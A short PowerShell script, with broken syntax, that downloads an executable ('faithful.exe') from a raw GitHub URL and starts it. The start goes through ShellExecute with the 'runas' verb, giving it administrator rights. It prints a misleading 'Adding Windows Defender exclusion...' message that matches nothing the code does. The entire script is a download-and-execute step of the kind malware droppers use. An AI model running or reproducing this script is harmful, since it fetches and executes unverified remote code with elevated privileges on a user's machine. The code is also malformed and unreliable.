$scriptblock = (
Write-Output "Starting script..."\
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"\
Write-Output "Adding Windows Defender exclusion..."\
Start-Process ("faithful.exe")\
Write-Output "Done!"\
)
# TODO: make -NoExit a parameter
# TODO: just open PS (no -Command parameter) if $scriptblock -eq ''
$sh = new-object -com 'Shell.Application'
$sh.ShellExecute('powershell', "-NoExit -Command $scriptblock", '', 'runas')